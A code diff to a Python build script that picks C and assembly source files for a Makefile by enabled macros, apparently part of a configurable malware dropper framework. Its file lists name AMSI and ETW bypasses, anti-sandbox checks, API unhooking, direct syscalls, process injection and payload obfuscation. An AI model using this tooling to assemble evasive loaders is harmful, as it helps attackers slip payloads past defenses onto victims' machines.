@@ -15,16 +15,130 @@ def replace_placeholders(file_path, replacements):
     with open(file_path, 'w') as file:
         file.writelines(lines)
 
-def set_makefile_source_files(source_path):    
-    c_files = []
-    asm_files = []
-    for root, _, files in os.walk(source_path):
-        for file in files:
-            if file.endswith(".c"):
-                c_files.append(os.path.relpath(os.path.join(root, file), start=source_path))
-            elif file.endswith(".nasm"):
-                asm_files.append(os.path.relpath(os.path.join(root, file), start=source_path))
+def _get_required_source_files(preprocessing_macros):
+    """
+    Returns a tuple of (required_c_files, required_asm_files) based on the provided preprocessing macros.
+    """
+    # Core files that are always required
+    core_c_files = [
+        'dropper.c',
+        'config.c',
+        'modules/crypto/crypto.c',
+        'modules/entropy/entropy.c',
+        'modules/injectors/injectors.c',
+        'modules/loaders/loaders.c',
+        'modules/stealth_techniques/api_hashing.c',
+        'modules/stealth_techniques/iat_obfuscation.c',
+        'modules/entropy/entropy.c',
+        'modules/entropy/custom_win_api.c',
+        'utils/debug.c',
+        'utils/hardware_breakpoints.c',
+        'utils/process_utils.c',
+        'utils/utils.c',
+    ]
+    
+    # Core NASM files that are always required
+    core_asm_files = []
+    
+    # Map of preprocessing macros to their required C source files
+    macro_to_c_files = {
+        # Anti Analysis
+        'ANTI_ANALYSIS_ENABLED': [
+            'modules/anti_sandbox/anti_sandbox.c',
+            'modules/anti_sandbox/delay.c',
+            'modules/anti_sandbox/mouse_action.c',
+            'modules/anti_sandbox/self_delete.c'
+        ],
+        
+        # AMSI Bypass
+        'AMSI_BYPASS': [
+            'modules/amsi_bypass/amsi_bypass.c',
+            'modules/amsi_bypass/function_patching.c'
+        ],
+        
+        # Block ETW
+        'ETW_BYPASS': [
+            'modules/etw_bypass/etw_bypass.c',
+            'modules/etw_bypass/function_patching.c',
+            'modules/etw_bypass/hbp_hooking.c'
+        ],
+        
+        # Unhooking
+        'UNHOOKING_ENABLED': ['modules/unhooking/unhooking.c'],
+        'KNOWN_DLLS_UNHOOKING': ['modules/unhooking/known_dlls_unhooking.c'],
+        'SUSPENDED_PROCESS_UNHOOKING': ['modules/unhooking/suspended_process_unhooking.c'],
+        
+        # Encryption
+        'ENCRYPTED_PAYLOAD': ['modules/crypto/crypto.c'],
+        'AES_ENCRYPTION': ['modules/crypto/aes_encryption.c'],
+        'CHACHA20_ENCRYPTION': ['modules/crypto/chacha20_encryption.c'],
+        'DES_ENCRYPTION': ['modules/crypto/des_encryption.c'],
+        'RC4_ENCRYPTION': ['modules/crypto/rc4_encryption.c'],
+        'RSA_ENCRYPTION': ['modules/crypto/rsa_encryption.c'],
+        'XOR_ENCRYPTION': ['modules/crypto/xor_encryption.c'],
+        
+        # Obfuscation
+        'OBFUSCATED_PAYLOAD': ['modules/encoders/encoders.c'],
+        'IPV4_OBFUSCATION': ['modules/encoders/ipv4_encoding.c'],
+        'IPV6_OBFUSCATION': ['modules/encoders/ipv6_encoding.c'],
+        'MAC_OBFUSCATION': ['modules/encoders/mac_encoding.c'],
+        'UUID_OBFUSCATION': ['modules/encoders/uuid_encoding.c'],
+        
+        # Syscalls
+        'SYSCALL_ENABLED': ['syscalls/router.c', 'syscalls/syscalls.c', 'utils/syscall_functions.c'],
+        'HW_SYSCALLS': ['syscalls/direct/SysWhispers3/sw3_syscalls.c', 'syscalls/direct/SysWhispers3/sw3_common.c'],
+        'SW3_SYSCALLS': ['syscalls/direct/SysWhispers3/sw3_syscalls.c', 'syscalls/direct/SysWhispers3/sw3_common.c'],
+        
+        # Injectors
+        'REMOTE_PROCESS_INJECTION': ['modules/injectors/remote_process_injection.c'],
+        'APC_INJECTION': ['modules/injectors/apc_injection.c'],
+        'EARLY_BIRD_INJECTION': ['modules/injectors/early_bird_injection.c'],
+        
+        # Loaders
+        'IN_MEMORY': ['modules/loaders/in_memory.c'],
+        'FUNCTION_STOMPING': ['modules/loaders/function_stomping.c'],
+        'FILE_MAPPING': ['modules/loaders/file_mapping.c']
+    }
 
+    # Map of preprocessing macros to their required ASM source files
+    macro_to_asm_files = {
+        # SysWhispers3 ASM files
+        'SW3_SYSCALLS': [
+            'syscalls/direct/SysWhispers3/sw3_syscalls-asm.x64.nasm',
+            # 'syscalls/direct/SysWhispers3/sw3_syscalls-asm.x86.nasm'
+        ],
+    }
+
+    # Add C files based on enabled features
+    required_c_files = set(core_c_files)
+    required_asm_files = set(core_asm_files)
+    
+    for macro in preprocessing_macros:
+        # Add C files for the macro if defined
+        if macro in macro_to_c_files:
+            required_c_files.update(macro_to_c_files[macro])
+        # Add ASM files for the macro if defined
+        if macro in macro_to_asm_files:
+            required_asm_files.update(macro_to_asm_files[macro])
+    
+    # Return both C and ASM files
+    return sorted(required_c_files), sorted(required_asm_files)
+
+def set_makefile_source_files(source_path, preprocessing_macros=None):
+    """
+    Updates the Makefile with only the required source files based on preprocessing macros.
+    
+    Args:
+        source_path: Path to the source directory
+        preprocessing_macros: List of preprocessing macros that are enabled
+    """
+    if preprocessing_macros is None:
+        preprocessing_macros = []
+    
+    # Get required source files
+    c_files, asm_files = _get_required_source_files(preprocessing_macros)
+    
+    # Format C source files for Makefile
     formatted_sources = ""
     for i in range(0, len(c_files), 2):
         line = ' '.join(c_files[i:i+2])
@@ -32,8 +146,14 @@ def set_makefile_source_files(source_path):
             formatted_sources += line + " \\\n"
         else:
             formatted_sources += line
-    replace_placeholders(os.path.join(source_path, "Makefile"), {"/* SOURCE_FILES */": formatted_sources})
     
+    # Update Makefile with selected source files
+    replace_placeholders(
+        os.path.join(source_path, "Makefile"), 
+        {"/* SOURCE_FILES */": formatted_sources}
+    )
+    
+    # Use the ASM files determined by _get_required_source_files
     formatted_asm_sources = ""
     for i in range(0, len(asm_files), 2):
         line = ' '.join(asm_files[i:i+2])
@@ -41,7 +161,11 @@ def set_makefile_source_files(source_path):
             formatted_asm_sources += line + " \\\n"
         else:
             formatted_asm_sources += line
-    replace_placeholders(os.path.join(source_path, "Makefile"), {"/* ASM_SOURCE_FILES */": formatted_asm_sources})
+            
+    replace_placeholders(
+        os.path.join(source_path, "Makefile"), 
+        {"/* ASM_SOURCE_FILES */": formatted_asm_sources}
+    )
 
 def fill_config_header(header_data: dict, project_dir: str):
     header_constants = {}
